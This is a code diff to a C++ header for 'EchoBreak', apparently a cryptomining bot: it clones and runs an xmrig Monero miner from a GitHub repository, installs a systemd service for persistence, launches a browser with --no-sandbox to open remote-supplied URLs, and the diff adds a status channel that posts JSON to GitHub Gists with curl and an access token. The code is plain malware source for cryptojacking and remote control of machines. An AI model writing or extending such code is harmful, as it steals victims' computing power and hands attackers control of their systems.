@@ -1,6 +1,7 @@
 #include <fstream>
 #include <cstring>
 #include <arpa/inet.h>
+#include <string>
 #include <unistd.h>
 #include <vector>
 #include <array>
@@ -11,6 +12,14 @@
 #define BUFFER_SIZE 256
 #define MINER_GH std::string("https://github.com/xmr-rx0/EchoBreak-xmrig.git")
 #define SERVICE "/etc/systemd/system/eb.service";
+
+struct JsonPayload
+{
+    std::string name;
+    std::string status;
+    std::string xmrig_status;
+    std::string err;
+};
 
 class Worker_utils
 {
@@ -32,31 +41,39 @@ public:
     void install(std::string user_name);
 
     // Base functions
-    // Warning, that is blocking function, returns a splited by (;) vector of string
+    // Warning, that is blocking function, sets messages as a splited by (;) vector of string
     void receive(std::vector<std::string> &messages);
     void send(std::string data);
+    void sendStatus();
 
+    // Returns a filename
+    
     // Xmrig
     inline void instXmrig()
     {
         system(("git clone " + MINER_GH).c_str());
         system("chmod +x EchoBreak-xmrig/conf && EchoBreak-xmrig/./conf");
     };
-    inline void runXmrix() { system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig"); };
-    inline void stopXmrig() { system("pkill xmrig"); };
-
+    inline void runXmrix() { system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig"); is_xmrig_running = "runnning"; };
+    inline void stopXmrig() { system("pkill xmrig"); is_xmrig_running = "standby"; };
+    
     // :)
     inline void openUrl(std::string url) { system(("yandex-browser-stable --no-sandbox " + url).c_str()); }; // Replace to your browser
-
-private:
+    
+    private:
     void init();
-    void err(std::string wtf); // TODO: server loging
+    void err(std::string wtf);
+    
+    std::string createJsonStatusFile(const JsonPayload &payload); 
+    void uploadToGist(const JsonPayload &payload);
 
 private:
     const std::string m_service = SERVICE;
     std::string m_broadcast_ip;
 
-    uint m_msg_count = 1; // number of message to receive (is useful when ping)
+    uint m_msg_count = 1; // Number of message to receive (is useful when ping)
+
+    std::string is_xmrig_running = "standby";
 
 private:
     // Variables for sending data to the server
@@ -113,4 +130,25 @@ static std::string exec(const char *cmd)
 
 static std::string getBroadCastAddress(){
     return exec("INTERFACE=$(ip route show default | awk \'{print $5}\') && ip -4 addr show $INTERFACE | awk \'$1 == \"inet\" {print $4}'");
+}
+
+static int run_gist_upload(const std::string &token, const std::string &filename, std::string &out_response) {
+    std::string cmd = "curl -sS -H \"Authorization: token " + token +
+                      "\" -H \"Accept: application/vnd.github+json\" "
+                      "-H \"Content-Type: application/json\" -X POST "
+                      "https://api.github.com/gists --data-binary @" + filename;
+
+    std::array<char, 4096> buffer;
+    out_response.clear();
+
+    std::unique_ptr<FILE, int (*)(FILE *)> pipe(popen(cmd.c_str(), "r"), pclose);
+    if (!pipe) return -1;
+
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        out_response += buffer.data();
+    }
+
+    int rc = pclose(pipe.release()); 
+    if (WIFEXITED(rc)) return WEXITSTATUS(rc);
+    return rc;
 }
